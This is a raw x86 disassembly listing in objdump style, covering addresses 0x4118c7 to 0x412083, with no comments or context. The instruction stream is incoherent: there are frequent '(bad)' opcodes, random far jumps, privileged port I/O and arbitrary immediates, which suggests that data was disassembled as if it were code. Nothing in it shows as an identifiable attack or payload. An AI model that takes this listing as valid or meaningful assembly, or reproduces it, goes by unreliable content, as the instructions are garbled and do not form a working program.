  4118c7:	mov    BYTE PTR [edx],al
  4118c9:	xchg   edx,eax
  4118ca:	(bad)  
  4118cb:	arpl   WORD PTR ds:0x4e5c8853,ax
  4118d1:	sbb    al,0x35
  4118d3:	in     eax,0x1e
  4118d5:	xchg   bx,ax
  4118d7:	sbb    eax,0xee7dd419
  4118dc:	or     al,0x92
  4118de:	dec    eax
  4118df:	pop    ecx
  4118e0:	pusha  
  4118e1:	int    0x7c
  4118e3:	adc    eax,0x28881b4b
  4118e8:	or     BYTE PTR [ecx-0x53],cl
  4118eb:	push   edi
  4118ec:	pop    ebx
  4118ed:	rcr    BYTE PTR [eax],cl
  4118ef:	and    edi,DWORD PTR [edi+0x3b67830c]
  4118f5:	rol    BYTE PTR [edx],1
  4118f7:	adc    DWORD PTR ds:0xfcb69454,ebx
  4118fd:	test   al,0xf9
  4118ff:	push   0xf16fd491
  411904:	and    DWORD PTR [edi],esi
  411906:	xor    ah,bl
  411908:	mov    ecx,0x391b942
  41190d:	retf   
  41190e:	pop    ss
  41190f:	jg     0x411904
  411911:	nop
  411912:	cmp    al,0x28
  411914:	sub    eax,0x3c581de8
  411919:	pop    ebx
  41191a:	mov    bh,0x7a
  41191c:	outs   dx,DWORD PTR ds:[esi]
  41191d:	fld    DWORD PTR [esi-0x6f50a605]
  411923:	test   esi,esi
  411925:	ins    BYTE PTR es:[edi],dx
  411926:	xchg   esp,eax
  411927:	outs   dx,DWORD PTR ds:[esi]
  411928:	jnp    0x4118f0
  41192a:	ror    eax,cl
  41192c:	call   DWORD PTR [ebx]
  41192e:	dec    ecx
  41192f:	pusha  
  411930:	aad    0x8d
  411932:	xchg   edx,eax
  411933:	imul   edi,DWORD PTR [edi+0x8ed17ee],0x62720776
  41193d:	aam    0xe4
  41193f:	and    BYTE PTR [edi-0x6953da7a],cl
  411945:	ds push ds
  411947:	dec    edx
  411948:	arpl   ax,sp
  41194a:	lahf   
  41194b:	xchg   edi,eax
  41194c:	mov    ebx,0x3be028c6
  411951:	jecxz  0x4119cc
  411953:	addr16 pop esi
  411955:	fs call 0xb01de443
  41195b:	in     eax,0xd9
  41195d:	and    ebx,ecx
  41195f:	dec    ebx
  411960:	test   BYTE PTR [edi-0x7b],al
  411963:	xchg   edx,eax
  411964:	adc    al,0xd1
  411966:	push   esi
  411967:	das    
  411968:	inc    esp
  411969:	retf   0xa927
  41196c:	push   ebx
  41196d:	push   0xffffffb6
  41196f:	inc    ebp
  411970:	mov    ebp,0x8f80b91c
  411975:	arpl   WORD PTR [ebx+0xce64d62],bp
  41197b:	push   es
  41197c:	shr    DWORD PTR [esi-0x74],1
  41197f:	(bad)  
  411980:	std    
  411981:	cmp    edi,esp
  411983:	adc    DWORD PTR [esi+0x0],0x65
  411987:	pop    esp
  411988:	pop    esp
  411989:	cwde   
  41198a:	outs   dx,DWORD PTR ds:[esi]
  41198b:	leave  
  41198c:	jo     0x4119c0
  41198e:	les    ebx,FWORD PTR [edx]
  411990:	ret    
  411991:	test   al,0x76
  411993:	add    ebx,DWORD PTR [esi]
  411995:	jnp    0x4119d7
  411997:	cmc    
  411998:	push   esp
  411999:	je     0x411950
  41199b:	pop    ds
  41199c:	sbb    eax,0xfd4d6c0
  4119a1:	arpl   WORD PTR [eax+ebx*4+0x47],cx
  4119a5:	daa    
  4119a6:	xor    al,0x98
  4119a8:	adc    BYTE PTR [ecx+0x10a2f819],0x22
  4119af:	loope  0x41199b
  4119b1:	mov    edi,0x6672e14
  4119b6:	scas   eax,DWORD PTR es:[edi]
  4119b7:	pop    edx
  4119b8:	jg     0x411999
  4119ba:	sbb    DWORD PTR [ebx+0x31],edi
  4119bd:	icebp  
  4119be:	add    al,al
  4119c0:	dec    edi
  4119c1:	mov    ch,BYTE PTR [eax]
  4119c3:	out    0x8,eax
  4119c5:	jl     0x41198f
  4119c7:	jmp    0x4119c9
  4119c9:	mov    ecx,0x744d6196
  4119ce:	stos   DWORD PTR es:[edi],eax
  4119cf:	push   esp
  4119d0:	mov    ch,0xda
  4119d2:	jecxz  0x4119f9
  4119d4:	shr    DWORD PTR [ebp-0x200a97bb],cl
  4119da:	iret   
  4119db:	jecxz  0x4119f0
  4119dd:	dec    edx
  4119de:	bswap  esp
  4119e0:	scas   al,BYTE PTR es:[edi]
  4119e1:	sbb    eax,0xeac21175
  4119e6:	pushf  
  4119e7:	xor    DWORD PTR [ebx],0x60dd9e6
  4119ed:	pushf  
  4119ee:	sahf   
  4119ef:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4119f1:	jno    0x411980
  4119f3:	jne    0x411a54
  4119f5:	cmp    bl,bl
  4119f7:	push   ecx
  4119f8:	xchg   dl,ch
  4119fa:	aad    0xec
  4119fc:	mov    BYTE PTR [edi],ah
  4119fe:	push   ss
  4119ff:	lds    eax,FWORD PTR [ecx-0x3e486bfc]
  411a05:	pop    esi
  411a06:	jmp    0xd319:0xdd584a12
  411a0d:	out    dx,al
  411a0e:	or     BYTE PTR [ecx+0x21a14a8],bl
  411a14:	(bad)  
  411a15:	push   ss
  411a16:	shl    DWORD PTR [edi+0x9],1
  411a19:	int3   
  411a1a:	sbb    eax,0xf6698c47
  411a1f:	sbb    esp,esp
  411a21:	(bad)  
  411a22:	dec    edi
  411a23:	pop    ss
  411a24:	(bad)  
  411a25:	mov    edx,0xdff7e334
  411a2a:	test   DWORD PTR [edx+edi*8],edx
  411a2d:	mov    ds:0x88105ac1,eax
  411a32:	imul   eax,DWORD PTR [edi*1-0x27c94bf4],0xffffffaf
  411a3a:	jbe    0x411a1e
  411a3c:	idiv   BYTE PTR [ebp-0x51e7cb4b]
  411a42:	and    cl,BYTE PTR [eax+eax*2]
  411a45:	pop    edx
  411a46:	sbb    bh,BYTE PTR [edx-0x26]
  411a49:	nop
  411a4a:	xchg   esp,eax
  411a4b:	(bad)  
  411a4c:	jmp    0xd22d1fae
  411a51:	cdq    
  411a52:	jl     0x411ac6
  411a54:	out    0x6b,al
  411a56:	in     al,dx
  411a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a58:	pushf  
  411a59:	std    
  411a5a:	inc    ebp
  411a5b:	xor    DWORD PTR ds:0x5d9fd8d,esp
  411a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a62:	or     cl,BYTE PTR ds:0xa111647e
  411a68:	ins    DWORD PTR es:[edi],dx
  411a69:	out    dx,eax
  411a6a:	sbb    eax,0x73013ff3
  411a6f:	fnsave [ecx]
  411a71:	aam    0x1e
  411a73:	jge    0x411a16
  411a75:	out    dx,eax
  411a76:	ds std 
  411a78:	cwde   
  411a79:	icebp  
  411a7a:	pop    edi
  411a7b:	in     al,dx
  411a7c:	xor    BYTE PTR [eax-0x28ce967e],bh
  411a82:	push   esp
  411a83:	mov    ?,ecx
  411a85:	and    ecx,esp
  411a87:	mov    al,BYTE PTR [esi+eiz*2]
  411a8a:	adc    bh,BYTE PTR [esi+0x520e0805]
  411a90:	je     0x411a92
  411a92:	ror    BYTE PTR [ebp+0x1c],1
  411a95:	mov    edx,0xa2668a3a
  411a9a:	shr    DWORD PTR [ecx],cl
  411a9c:	cmp    edx,DWORD PTR [edx+0x5583fe1d]
  411aa2:	into   
  411aa3:	inc    edi
  411aa4:	mov    eax,0x303522c5
  411aa9:	inc    ebx
  411aaa:	out    0x8a,al
  411aac:	data16 out dx,al
  411aae:	(bad)  
  411ab0:	adc    dh,bl
  411ab2:	loopne 0x411a75
  411ab4:	xlat   BYTE PTR ds:[ebx]
  411ab5:	and    al,0xf9
  411ab7:	(bad)  
  411ab8:	jo     0x411ab0
  411aba:	loop   0x411af6
  411abc:	cmc    
  411abd:	pop    eax
  411abe:	or     eax,0x287bb2e9
  411ac3:	cdq    
  411ac4:	pcmpgtd mm5,QWORD PTR [ecx]
  411ac7:	push   esp
  411ac8:	out    0x3a,al
  411aca:	mov    ecx,fs
  411acc:	loop   0x411ad4
  411ace:	cmp    BYTE PTR [edx],dl
  411ad0:	cmp    bh,al
  411ad2:	iret   
  411ad3:	(bad)  
  411ad5:	(bad)
  411ad8:	dec    eax
  411ad9:	gs rcr bh,0x9c
  411add:	(bad)  
  411ade:	xor    BYTE PTR [edx+eiz*4],bl
  411ae1:	and    ch,BYTE PTR [edx-0x4f]
  411ae4:	ret    0xba99
  411ae7:	pop    esp
  411ae8:	mov    cl,0xd0
  411aea:	mov    WORD PTR [edx+eax*2+0xc2a708a],ds
  411af1:	xor    al,0x9c
  411af3:	imul   BYTE PTR [edx-0x80]
  411af6:	push   edx
  411af7:	xchg   esp,eax
  411af8:	fimul  DWORD PTR [ecx-0x1abc0b5b]
  411afe:	fcomp  DWORD PTR [eax-0x27]
  411b01:	aaa    
  411b02:	pop    esi
  411b03:	dec    edi
  411b04:	stos   BYTE PTR es:[edi],al
  411b05:	fld    TBYTE PTR [edi+0x70]
  411b08:	mov    dl,0x86
  411b0a:	ret    0x8724
  411b0d:	pop    esp
  411b0e:	mov    bh,0x18
  411b10:	int3   
  411b11:	mov    dl,0x2a
  411b13:	inc    edx
  411b14:	cwde   
  411b15:	lea    edx,[edi]
  411b17:	push   ecx
  411b18:	and    ch,BYTE PTR [ebx]
  411b1a:	in     al,0x7d
  411b1c:	pusha  
  411b1d:	rcr    DWORD PTR [edi-0x27],cl
  411b20:	es ret 
  411b22:	jmp    0x411b32
  411b24:	mov    DWORD PTR [ecx-0x47],ebx
  411b27:	or     edx,DWORD PTR [ebx+0x3f2fe7c1]
  411b2d:	or     eax,0x8464826d
  411b32:	mov    edx,0x3ad7e3e6
  411b37:	push   ds
  411b38:	(bad)  
  411b39:	icebp  
  411b3a:	or     ebx,DWORD PTR [ebp-0x5b]
  411b3d:	loopne 0x411b77
  411b3f:	sbb    ch,BYTE PTR [ecx+0x1b131ddb]
  411b45:	sahf   
  411b46:	mov    ebp,0x3cb05ad8
  411b4b:	sbb    edx,DWORD PTR [ecx-0x31]
  411b4e:	imul   edi,DWORD PTR [ecx-0x4],0xd9b2d003
  411b55:	push   esi
  411b56:	fistp  DWORD PTR [ebx]
  411b58:	cmp    ecx,DWORD PTR [ecx+0x1a7d92c0]
  411b5e:	addr16 jle 0x411b1a
  411b61:	sub    BYTE PTR [ebx-0xd44d3f8],bl
  411b67:	jne    0x411bba
  411b69:	pop    esp
  411b6a:	sbb    eax,0x69c9ad4f
  411b6f:	inc    esi
  411b70:	xchg   DWORD PTR [eax-0x6c6d104b],edx
  411b76:	clc    
  411b77:	mov    bh,0x88
  411b79:	icebp  
  411b7a:	clc    
  411b7b:	sti    
  411b7c:	je     0x411be9
  411b7e:	cmp    DWORD PTR [ebp+0x7d],ebp
  411b81:	mov    al,ds:0x3db73f96
  411b86:	fs popa 
  411b88:	inc    eax
  411b89:	or     DWORD PTR [ebx-0x53],esi
  411b8c:	aad    0x7e
  411b8e:	sub    edi,DWORD PTR [eax]
  411b90:	ss mov dl,0xb3
  411b93:	pop    ebp
  411b94:	sahf   
  411b95:	mov    ebx,0xb22083ee
  411b9a:	mov    eax,0x8b3948bd
  411b9f:	jae    0x411bf1
  411ba1:	popf   
  411ba2:	ret    0x7750
  411ba5:	(bad)  
  411ba6:	fstp   DWORD PTR [edx+0x4d77fe04]
  411bac:	cmc    
  411bad:	les    eax,FWORD PTR ds:0x1afd6af9
  411bb3:	out    0x7f,eax
  411bb5:	sub    BYTE PTR [esi-0x5371efaf],dh
  411bbb:	seto   bl
  411bbe:	cmp    ah,cl
  411bc0:	in     al,dx
  411bc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bc2:	dec    ebx
  411bc3:	mov    bl,0xa1
  411bc5:	iret   
  411bc6:	cmp    al,BYTE PTR [ecx+0x65]
  411bc9:	stos   BYTE PTR es:[edi],al
  411bca:	call   0x639:0xb3272e
  411bd1:	scas   eax,DWORD PTR es:[edi]
  411bd2:	push   0x30
  411bd4:	pop    ebx
  411bd5:	sub    BYTE PTR [edx+0x6b],0xe8
  411bd9:	retf   
  411bda:	rcr    BYTE PTR [esi-0x5139c238],cl
  411be0:	cmp    al,0x7a
  411be2:	loope  0x411baf
  411be4:	or     al,0xff
  411be6:	hlt    
  411be7:	or     eax,0x1f2f7099
  411bec:	bts    DWORD PTR [esi],esi
  411bef:	pop    ecx
  411bf0:	lahf   
  411bf1:	jo     0x411c3d
  411bf3:	jg     0x411b8c
  411bf5:	fidivr DWORD PTR [edx+0x47]
  411bf8:	jae    0x411be6
  411bfa:	imul   ecx,DWORD PTR [esi-0x36],0x6f7243c4
  411c01:	or     DWORD PTR [ebx-0x1d],eax
  411c04:	xor    DWORD PTR [ecx+0x12],ebx
  411c07:	je     0x411c1a
  411c09:	int3   
  411c0a:	fs push ds
  411c0c:	ret    0xfa9e
  411c0f:	jl     0x411c4e
  411c11:	cmp    DWORD PTR [esi+0x33],0x50
  411c15:	add    eax,0x8f118087
  411c1a:	dec    eax
  411c1b:	es dec edx
  411c1d:	out    0xd,eax
  411c1f:	and    BYTE PTR [ecx],bh
  411c21:	clc    
  411c22:	mov    ah,0x0
  411c24:	xlat   BYTE PTR ds:[ebx]
  411c25:	outs   dx,DWORD PTR ds:[esi]
  411c26:	mov    eax,0x23fc6f7b
  411c2b:	and    eax,0x379fff5d
  411c30:	mov    DWORD PTR [edi],ebx
  411c32:	loope  0x411bd6
  411c34:	shl    DWORD PTR [esi-0x7f],0xb2
  411c38:	mov    ds:0x63b7de0c,al
  411c3d:	nop
  411c3e:	or     BYTE PTR [ebx-0x50],bl
  411c41:	add    BYTE PTR [eax-0x49236e91],bl
  411c47:	adc    BYTE PTR [ebx-0x7e],ch
  411c4a:	inc    ecx
  411c4b:	fcom   DWORD PTR [ebx-0x4bf38df6]
  411c51:	ja     0x411c76
  411c53:	dec    edx
  411c54:	ds xchg ebp,eax
  411c56:	dec    eax
  411c57:	add    eax,0xa68e2cbc
  411c5c:	sbb    cl,BYTE PTR [ebp-0x3f44a158]
  411c62:	cmp    DWORD PTR [edi+0x29ef86f6],edi
  411c68:	add    ah,BYTE PTR [ebp-0xbab89d5]
  411c6e:	sbb    DWORD PTR [esi],ebx
  411c70:	push   edi
  411c71:	ins    BYTE PTR es:[edi],dx
  411c72:	or     BYTE PTR [esi-0x28],bh
  411c75:	adc    dh,dl
  411c77:	and    ah,bl
  411c79:	mov    ds:0xbb6a9566,eax
  411c7e:	clc    
  411c7f:	xor    DWORD PTR [ebp-0x4ab184a5],ecx
  411c85:	pop    edx
  411c86:	or     esi,DWORD PTR [edi]
  411c88:	sbb    BYTE PTR [edi-0x624f2c0a],bh
  411c8e:	and    ch,BYTE PTR [ebx]
  411c90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c91:	jns    0x411c2c
  411c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c94:	into   
  411c95:	retf   
  411c96:	pop    esp
  411c97:	pop    ebx
  411c98:	or     dh,BYTE PTR [ebx+0x45a76281]
  411c9e:	inc    esi
  411c9f:	pop    ebx
  411ca0:	ins    BYTE PTR es:[edi],dx
  411ca1:	mov    eax,0xa43be80e
  411ca6:	mov    esp,0x53486d9b
  411cab:	mov    ebp,0x7e6f1e15
  411cb0:	jg     0x411c5e
  411cb2:	clc    
  411cb3:	imul   ecx,DWORD PTR [eax-0x62abb856],0x1e0501db
  411cbd:	push   edx
  411cbe:	cdq    
  411cbf:	xor    BYTE PTR [eax-0x61ae7008],0x17
  411cc6:	push   ebx
  411cc7:	rcr    eax,0xa1
  411cca:	outs   dx,BYTE PTR ds:[esi]
  411ccb:	dec    edi
  411ccc:	or     eax,0x71a114dd
  411cd1:	jae    0x411cc6
  411cd3:	arpl   WORD PTR [edi],ax
  411cd5:	jo     0x411d36
  411cd7:	jmp    0xbb601ffd
  411cdc:	aas    
  411cdd:	and    al,BYTE PTR [edi+edi*8+0xd842378]
  411ce4:	popa   
  411ce5:	pop    ebx
  411ce6:	mov    ch,0x38
  411ce8:	push   edx
  411ce9:	or     eax,0x451f2c5f
  411cee:	sub    BYTE PTR [ebx+0x13f24a11],dh
  411cf4:	mov    edx,0x60241f16
  411cf9:	std    
  411cfa:	jg     0x411caf
  411cfc:	dec    ecx
  411cfd:	pop    ds
  411cfe:	sbb    ah,bh
  411d00:	test   DWORD PTR [esi],edx
  411d02:	dec    ecx
  411d03:	jo     0x411d4a
  411d05:	stc    
  411d06:	lea    ecx,[ecx-0x2f1243fa]
  411d0c:	and    eax,0x796bacb4
  411d11:	jno    0x411d49
  411d13:	jae    0x411d5a
  411d15:	shl    ebx,0x2c
  411d18:	pushf  
  411d19:	retf   
  411d1a:	sub    eax,0x5adf905b
  411d1f:	or     cl,BYTE PTR es:[ebp-0x480ff7a7]
  411d26:	aas    
  411d27:	push   ds
  411d28:	lahf   
  411d29:	add    BYTE PTR [edx+edi*4],al
  411d2c:	inc    edx
  411d2d:	add    al,0xb9
  411d2f:	cwde   
  411d30:	pop    ebp
  411d31:	(bad)  
  411d32:	rcr    BYTE PTR [edx+esi*4],cl
  411d35:	inc    ebx
  411d36:	jmp    0xebd060d9
  411d3b:	push   0x9ec8dd9d
  411d40:	loopne 0x411ccb
  411d42:	jg     0x411d5b
  411d44:	int    0xab
  411d46:	dec    ebx
  411d47:	mov    ds:0xbdb9ff9f,al
  411d4c:	mov    cl,0xd5
  411d4e:	cwde   
  411d4f:	loopne 0x411dbb
  411d51:	push   es
  411d52:	dec    ebp
  411d53:	fimul  DWORD PTR gs:[ebx-0x31]
  411d57:	sbb    edi,ebx
  411d59:	aas    
  411d5a:	add    BYTE PTR [esp+ecx*1+0x11],dl
  411d5e:	test   al,0x75
  411d60:	in     al,0x60
  411d62:	cmp    al,0x77
  411d64:	xor    eax,0x5e693adc
  411d69:	pushf  
  411d6a:	mov    ds:0xdf9e8469,al
  411d6f:	and    dh,dl
  411d71:	sbb    al,0xec
  411d73:	rcr    al,0xd7
  411d76:	sub    ebx,DWORD PTR [ecx]
  411d78:	or     esi,ebx
  411d7a:	xchg   ebx,eax
  411d7b:	dec    ecx
  411d7c:	push   ebp
  411d7d:	mov    ds:0xfb4bf19d,eax
  411d82:	or     dl,bl
  411d84:	pop    esi
  411d85:	lock neg BYTE PTR es:[esp+ebx*4]
  411d8a:	sbb    DWORD PTR ds:0xb6d60e48,ebx
  411d90:	outs   dx,DWORD PTR ds:[esi]
  411d91:	(bad)  
  411d92:	mov    esp,0x4b790f9b
  411d97:	sub    ecx,DWORD PTR [eax+0x8]
  411d9a:	cmp    ebp,DWORD PTR [esi+0x1f]
  411d9d:	std    
  411d9e:	jmp    0xa590:0xa41f1190
  411da5:	add    esi,0x0
  411da8:	nop
  411da9:	and    bl,BYTE PTR [edi+0x62]
  411dac:	mov    edx,DWORD PTR [esi+0x627047ad]
  411db2:	or     eax,DWORD PTR [ecx]
  411db4:	adc    eax,0xc41979b3
  411db9:	mov    esp,0xb154c13
  411dbe:	mov    BYTE PTR [edx],al
  411dc0:	mov    ds:0x8ff301fa,eax
  411dc5:	inc    esi
  411dc6:	iret   
  411dc7:	into   
  411dc8:	jmp    0x411d4d
  411dca:	test   al,0xb6
  411dcc:	mov    esi,0xed5026fb
  411dd1:	mov    ebx,0x18f8b0d4
  411dd6:	mov    ah,BYTE PTR [ecx-0xf]
  411dd9:	xor    al,ch
  411ddb:	push   es
  411ddc:	les    ecx,FWORD PTR [esi-0x3825d1d2]
  411de2:	sbb    ah,dh
  411de4:	lods   al,BYTE PTR ds:[esi]
  411de5:	sbb    eax,0x71ba2b86
  411dea:	cmp    dl,BYTE PTR [esi-0x7]
  411ded:	aad    0xb9
  411def:	mov    esp,0x37f09b5a
  411df4:	fnsave [esi]
  411df6:	dec    edx
  411df7:	rcr    DWORD PTR [edi-0x5efa5805],0xef
  411dfe:	or     eax,0xaf4bfaf6
  411e03:	mov    esi,0x661d6123
  411e08:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  411e0a:	sub    DWORD PTR [esi+0x6a],0xffffffe1
  411e0e:	xor    eax,0xb8db5591
  411e13:	stc    
  411e14:	lahf   
  411e15:	mov    ch,0x5c
  411e17:	fdecstp 
  411e19:	test   DWORD PTR [eax],ecx
  411e1b:	popa   
  411e1c:	mov    esp,DWORD PTR [esi]
  411e1e:	fwait
  411e1f:	enter  0x948a,0x1e
  411e23:	pop    edi
  411e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e25:	(bad)  [eax+0x8]
  411e28:	gs xchg edi,eax
  411e2a:	pop    ecx
  411e2b:	stc    
  411e2c:	cmp    BYTE PTR [esi],bh
  411e2e:	sti    
  411e2f:	sbb    al,BYTE PTR [edx+0x3b]
  411e32:	aam    0x6f
  411e34:	ja     0x411e32
  411e36:	sub    al,0xc6
  411e38:	push   ds
  411e39:	pop    ebx
  411e3a:	data16 mov bh,0xf9
  411e3d:	mov    esi,0x868aad92
  411e42:	cwde   
  411e43:	adc    BYTE PTR ds:0x28e91325,0x3c
  411e4a:	stos   DWORD PTR es:[edi],eax
  411e4b:	inc    edx
  411e4c:	mov    ebx,0xcac30777
  411e51:	enter  0x902a,0xc
  411e55:	jnp    0x411e61
  411e57:	lahf   
  411e58:	cmc    
  411e59:	mov    cl,0x68
  411e5b:	mov    al,ds:0x1a211dda
  411e60:	add    edx,DWORD PTR [edx]
  411e62:	or     eax,0x63cd2b6e
  411e67:	pop    es
  411e68:	ins    BYTE PTR es:[edi],dx
  411e69:	rcr    BYTE PTR [edi+ecx*2+0xa0fecf4],cl
  411e70:	in     eax,0xbf
  411e72:	loope  0x411e45
  411e74:	iret   
  411e75:	xlat   BYTE PTR ds:[ebx]
  411e76:	push   edx
  411e77:	xlat   BYTE PTR ds:[ebx]
  411e78:	jns    0x411e62
  411e7a:	push   edx
  411e7b:	inc    ebp
  411e7c:	scas   eax,DWORD PTR es:[edi]
  411e7d:	inc    ecx
  411e7e:	hlt    
  411e7f:	add    BYTE PTR [edi],dl
  411e81:	sti    
  411e82:	and    dh,bh
  411e84:	dec    edi
  411e85:	adc    BYTE PTR [ebp-0x37],0x22
  411e89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e8a:	sub    eax,0x5b5ca03c
  411e8f:	gs fs arpl si,bp
  411e93:	pop    ecx
  411e94:	and    DWORD PTR [edi-0xe],ecx
  411e97:	lock les ebx,FWORD PTR [eax*4-0x6eb51ae6]
  411e9f:	rcl    BYTE PTR [ecx+0x666f165e],0x21
  411ea6:	xor    bl,BYTE PTR [eax+0x5b]
  411ea9:	mov    edx,0xada6f358
  411eae:	out    dx,al
  411eaf:	fnstenv [edi+0xc]
  411eb2:	xchg   dl,ah
  411eb4:	test   al,0xa2
  411eb6:	addr16 loope 0x411eb4
  411eb9:	push   esp
  411eba:	lock mov edx,0xfbc35b4c
  411ec0:	(bad)  
  411ec1:	jp     0x411f25
  411ec3:	xor    ebp,eax
  411ec5:	mov    al,0x27
  411ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ec8:	xor    al,0xb4
  411eca:	jp     0x411eb2
  411ecc:	sahf   
  411ecd:	adc    eax,0x4c82ab
  411ed2:	mov    ah,0xe8
  411ed4:	inc    edi
  411ed5:	cmp    al,0xea
  411ed7:	outs   dx,BYTE PTR ds:[esi]
  411ed8:	push   es
  411ed9:	mov    al,ds:0x63b15974
  411ede:	pop    edx
  411edf:	mov    esi,0x2505dd57
  411ee4:	test   al,0x40
  411ee6:	call   0xff298de6
  411eeb:	scas   eax,DWORD PTR es:[edi]
  411eec:	cmp    ah,BYTE PTR [eax-0x70]
  411eef:	adc    DWORD PTR ds:0xb6ef9c8c,ebx
  411ef5:	lahf   
  411ef6:	xor    esp,DWORD PTR [edx+0x62]
  411ef9:	mov    edi,0xa5d8b703
  411efe:	adc    al,0xdc
  411f00:	test   eax,0x652a6653
  411f05:	push   ds
  411f06:	out    0x87,eax
  411f08:	scas   al,BYTE PTR es:[edi]
  411f09:	adc    DWORD PTR [ebx],ecx
  411f0b:	adc    dh,bh
  411f0d:	xchg   ecx,eax
  411f0e:	fcomip st,st(2)
  411f10:	clc    
  411f11:	data16 cmp al,0xa5
  411f14:	xchg   ecx,eax
  411f15:	jbe    0x411f17
  411f17:	enter  0x80ec,0x1f
  411f1b:	jmp    0x2d17f773
  411f20:	ins    BYTE PTR es:[edi],dx
  411f21:	cld    
  411f22:	mov    edi,0x8a1605a6
  411f27:	mov    DWORD PTR [edx+0x1b],edi
  411f2a:	repnz into 
  411f2c:	mov    bh,0xa4
  411f2e:	xchg   esp,eax
  411f2f:	(bad)  
  411f30:	test   al,0xb8
  411f32:	mov    ebp,0x827f44e3
  411f37:	popf   
  411f38:	pop    eax
  411f39:	or     esp,0xc3880a0a
  411f3f:	hlt    
  411f40:	hlt    
  411f41:	push   ds
  411f42:	loop   0x411fac
  411f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f45:	cmp    ecx,DWORD PTR [edx+0x5a1af903]
  411f4b:	and    DWORD PTR [edi],0xf3815710
  411f51:	out    dx,al
  411f52:	and    DWORD PTR [esi],ebp
  411f54:	scas   eax,DWORD PTR es:[edi]
  411f55:	inc    edx
  411f56:	adc    ch,BYTE PTR [eax]
  411f58:	jnp    0x411ee9
  411f5a:	sub    BYTE PTR [esp+ecx*2+0x469d1ab1],bl
  411f61:	mov    WORD PTR [ebp+0x635a4354],gs
  411f67:	push   cs
  411f68:	inc    ebp
  411f69:	sbb    BYTE PTR [edx],cl
  411f6b:	jl     0x411f04
  411f6d:	dec    ecx
  411f6e:	jb     0x411f3e
  411f70:	mov    cl,0x19
  411f72:	dec    eax
  411f73:	(bad)  [eax]
  411f75:	rcr    DWORD PTR [edx+0x69],cl
  411f78:	cmp    al,0xda
  411f7a:	jns    0x411f5c
  411f7c:	ins    DWORD PTR es:[edi],dx
  411f7d:	mov    edi,0xd61d739a
  411f82:	push   esi
  411f83:	in     al,0x24
  411f85:	push   ebx
  411f86:	in     eax,dx
  411f87:	icebp  
  411f88:	js     0x411f10
  411f8a:	data16 adc BYTE PTR [ecx+ebx*2+0x76e552e7],al
  411f92:	or     al,0x7b
  411f94:	or     BYTE PTR [ecx],cl
  411f96:	outs   dx,DWORD PTR ds:[esi]
  411f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f98:	jg     0x411f3b
  411f9a:	sub    al,0xfc
  411f9c:	mov    edi,0x91965245
  411fa1:	rcr    BYTE PTR [ebx-0xa],1
  411fa4:	cwde   
  411fa5:	and    BYTE PTR [esi],0x47
  411fa8:	icebp  
  411fa9:	mov    esp,0x1fb953ac
  411fae:	dec    esi
  411faf:	or     BYTE PTR [edx-0x6fe08035],bl
  411fb5:	adc    al,0x6f
  411fb7:	test   eax,0xca20edf1
  411fbc:	js     0x411f49
  411fbe:	ret    0xc6a6
  411fc1:	jbe    0x411f4b
  411fc3:	mov    al,0xc4
  411fc5:	add    eax,0x9ce9c796
  411fca:	repz xchg edx,eax
  411fcc:	and    BYTE PTR [ecx+0x43881bd9],0x2f
  411fd3:	add    al,0xf9
  411fd5:	lods   eax,DWORD PTR ds:[esi]
  411fd6:	cmp    ecx,DWORD PTR [ebx-0x78676383]
  411fdc:	xchg   esi,eax
  411fdd:	adc    al,0xf9
  411fdf:	push   eax
  411fe0:	mov    al,bh
  411fe2:	cwde   
  411fe3:	add    dl,ch
  411fe5:	xor    al,BYTE PTR [esi+0x596de355]
  411feb:	push   ebx
  411fec:	mov    bl,0x8c
  411fee:	fmul   DWORD PTR ds:0x2f012545
  411ff4:	mov    edx,0x53d8e281
  411ff9:	leave  
  411ffa:	adc    al,0x35
  411ffc:	rol    BYTE PTR [ebp+edi*4+0x32],1
  412000:	(bad)  
  412001:	das    
  412002:	mov    al,ds:0xe8ab288c
  412007:	sub    al,0xa8
  412009:	or     DWORD PTR [esi+0x3c927760],ebp
  41200f:	out    dx,al
  412010:	mov    esp,0x398e08e
  412015:	and    dl,BYTE PTR [ebp+0x2dcb57cd]
  41201b:	aas    
  41201c:	inc    esi
  41201d:	mov    ds:0xfae742df,eax
  412022:	and    eax,0x540982d6
  412027:	jnp    0x41206f
  412029:	lahf   
  41202a:	imul   esp,esi,0xffffffa1
  41202d:	adc    al,ch
  41202f:	and    al,0x70
  412031:	sbb    bl,BYTE PTR [esi+0x40]
  412034:	loope  0x41204b
  412036:	aas    
  412037:	loopne 0x41206d
  412039:	stc    
  41203a:	stos   BYTE PTR es:[edi],al
  41203b:	jbe    0x41205c
  41203d:	aaa    
  41203e:	mov    ds:0x632f0e59,al
  412043:	in     eax,0x18
  412045:	push   ds
  412046:	scas   eax,DWORD PTR es:[edi]
  412047:	xor    DWORD PTR [eax],0xffffffec
  41204a:	push   ebx
  41204b:	(bad)  
  41204c:	es scas al,BYTE PTR es:[edi]
  41204e:	(bad)  
  412050:	and    bl,BYTE PTR [edi]
  412052:	dec    edx
  412053:	out    0x56,eax
  412055:	repz out 0x36,eax
  412058:	xchg   esi,eax
  412059:	and    cl,BYTE PTR [edx]
  41205b:	or     eax,0xfa78ef37
  412060:	(bad)  
  412061:	mov    ebp,0xa2324e74
  412066:	jnp    0x41207d
  412068:	aam    0xae
  41206a:	xchg   DWORD PTR [esp+eax*4],ecx
  41206d:	cmp    eax,0x40f17366
  412072:	fnstcw WORD PTR [eax+edi*1-0x61]
  412076:	fisub  WORD PTR [eax-0x34]
  412079:	nop
  41207a:	sub    al,0x3a
  41207c:	outs   dx,BYTE PTR ds:[esi]
  41207d:	cmc    
  41207e:	pop    edx
  41207f:	(bad)  
  412080:	aad    0x4f
  412082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412083:	mov    ds:0x5bd2e6fd,eax
